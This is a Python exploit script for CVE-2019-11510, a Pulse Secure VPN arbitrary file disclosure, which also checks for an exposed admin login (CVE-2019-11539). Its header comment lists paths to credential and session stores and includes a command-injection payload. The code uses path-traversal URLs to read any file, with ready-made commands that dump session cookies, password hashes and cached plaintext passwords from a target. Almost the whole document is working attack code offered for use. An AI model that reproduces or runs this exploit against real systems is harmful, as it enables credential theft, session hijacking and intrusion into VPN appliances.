#!/usr/bin/python3
'''
# version check
/data/runtime/JAM/Default/VERSION.pulse

# command injection
-r$x="ls /",system$x# 2>/data/runtime/tmp/tt/setcookie.thtml.ttc < 

#/dana-na/css/ds.js

# Potential Path

    /etc/passwd
    /etc/hosts
    /data/runtime/mtmp/system   <--- user and hashed password
    /data/runtime/mtmp/lmdb/dataa/data.mdb  <--- caches the plain-text password
    /data/runtime/mtmp/lmdb/dataa/lock.mdb
    /data/runtime/mtmp/lmdb/randomVal/data.mdb  <--- the user session ---> https://0/admin/
    /data/runtime/mtmp/lmdb/randomVal/lock.mdb

# Some guide
    # secret-key = ██████████
    ████
    dc=███,dc=duosecurity,dc=com
    cn=<USER>

    # LDAP password = ██████████
    ██████████
    █████
    ███████
    uid=<username>

    # hash plain password :
    *_getAttributes

# Cookies Value

    DSID=blah Path=/
'''
import requests
import os
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
from clint.textui import progress
#most of them are using self-signed SSL cert 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language':'en-US,en;q=0.5',
    'Accept-Encoding':'gzip, deflate',
    'Content-Type':'application/x-www-form-urlencoded',
}

# basically check CVE-2019-11539
def check_admin(source):
    cookies = {
    'lastRealm':'Admin%20Users',
    'DSSIGNIN':'url_admin',
    'DSSignInURL':'/admin/',
    'DSPERSISTMSG':'',
    }
    print("\n[*] Checking Administrator Login ...")
    page = "https://%s/dana-na/auth/url_admin/welcome.cgi" % source
    r = requests.get(page, headers=headers, cookies=cookies, verify=False)
    if "You do not have permission to login." not in r.text and r.status_code==200:
        print("[!]%s| WTF, Administrator page FOUND ᕕ( ᐛ )ᕗ\n" % str("—"*7))
        return True
    else:
        print("[-]%s| F*cK, Administrator was HIDDEN o(╥﹏╥)o\n" % str("—"*7))
        return False

def get_file(source, nfile):
    path = "./log/"
    if os.path.exists(path+nfile):
        os.remove(path+nfile)
    try:
        # NOTE the stream=True parameter below for download file
        with requests.get(source, verify=False, stream=True, timeout=300, allow_redirects=False) as r:
            r.raise_for_status()
            with open(path+nfile, 'wb') as f:
                total_length = int(r.headers.get('content-length'))
                for chunk in progress.bar(r.iter_content(chunk_size=16384), expected_size=(total_length/16384) + 1):
                    if chunk: # filter out keep-alive new chunks
                        f.write(chunk)
                        f.flush()
    except KeyboardInterrupt:
        print("Download g0t interrupt!")
        pass
    param = "python2 parse.py %s" % path+nfile
    os.system(param)

def check(host):
    try:
        checkVersion(url)
        print("\n[+] Checking Vulnerability ...")
        target ='https://%s/dana-na///css/ds.js?/dana/html5acc/guacamole/' % urlparse(host).netloc
        res = requests.get(target, verify=False, headers=headers, timeout=1.5)
    except:
        return 0
    if res.status_code!=200:
        return 0
    else:
        print("[!] w0w, it's vuln!")
        admin = check_admin(urlparse(url).netloc)
        log = "vuln.log"
        mode = 'a+' if os.path.exists(log) else 'w'
        fd = open(log, 'r')
        if urlparse(host).netloc not in fd.read():
            with open(log, mode) as f:
                if admin==True:
                    f.write('[+] %s - [Admin Page Found]\n' % host)
                else:
                    f.write('[+] %s\n' % host)
        fd.close()
        return 1
def checkVersion(host):
    url = 'https://%s/dana-na/nc/nc_gina_ver.txt' % urlparse(host).netloc
    res = requests.get(url,verify=False)
    if res.status_code==200:
        soup = BeautifulSoup(res.text,'lxml')
        print("\n[%s]\nVersion Detail : %s" % (soup.find('param', {'name':'ProductName'})['value'],soup.find('param', {'name':'ProductVersion'})['value']))
    else:
        print("\n[Version not Found!]")
def banner():
    print('''\t
    CVE  : 2019-11510
    Type : Arbitrary File Disclosure
    Author : muwa00[at]r!talin
    Greets : R!talin, K-Elektronik, RedSector7 and All fuck*rs!
    ''')
    
if __name__ == '__main__':
    banner()  
    while True:
        url = str(input("[target]> "))
        if "https" not in url:
            url = "https://%s/" % url
        if check(url):
            target = "https://%s" % urlparse(url).netloc
            print("[!] Turn into reader file mode, begin with /\n")
            while True:
                f = str(input("[%s](/etc/scut)> " % url))
                if f == "cookies":      
                    payload = "/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/"
                    nfile = urlparse(url).netloc+"_cookies.bin"
                    get_file(target + payload, nfile)
                    print("\n[!] User Cookies is dump on %s" % nfile)
                    continue
                elif f == "hash":
                    payload = "/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/"
                    nfile = urlparse(url).netloc+"_hash.bin"
                    get_file(target + payload, nfile)
                    print("\n[!] Hash is dump on %s" % nfile)
                    continue                
                elif f == "plain":
                    payload = "/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/"
                    nfile = urlparse(url).netloc+"_plain.bin"
                    get_file(target + payload, nfile)
                    print("\n[!] Plaintext Credential is dump on %s" % nfile)
                    continue                
                elif f == "q":
                    break
                payload = "/dana-na/../dana/html5acc/guacamole/../../../../../..%s?/dana/html5acc/guacamole/" % f
                res = requests.get(target + payload, headers=headers, verify=False)
                if res.status_code!=200:
                    print("\n\t[################| %s cannot be accessed |################]\n" % f)
                    continue
                print(res.text)
        else:
            print("[-] No indicate of vulnerable!")
            continue
